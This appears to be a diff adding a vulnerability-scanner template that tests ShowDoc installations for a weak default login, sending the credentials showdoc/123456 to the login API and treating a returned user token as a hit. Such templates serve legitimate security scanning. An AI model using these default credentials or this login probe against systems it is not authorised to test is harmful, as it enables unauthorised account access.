@@ -1,0 +1,24 @@
+id: poc-yaml-showdoc-dashboard-weak-pass
+info:
+  name: ShowDoc Weak Password Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: weak-password
+http:
+  - method: POST
+    path:
+      - "/server/index.php?s=/api/user/login"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      username=showdoc&password=123456&v_code=
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "\"username\":\"showdoc\""
+      - type: word
+        part: body
+        words:
+          - "\"user_token\":"
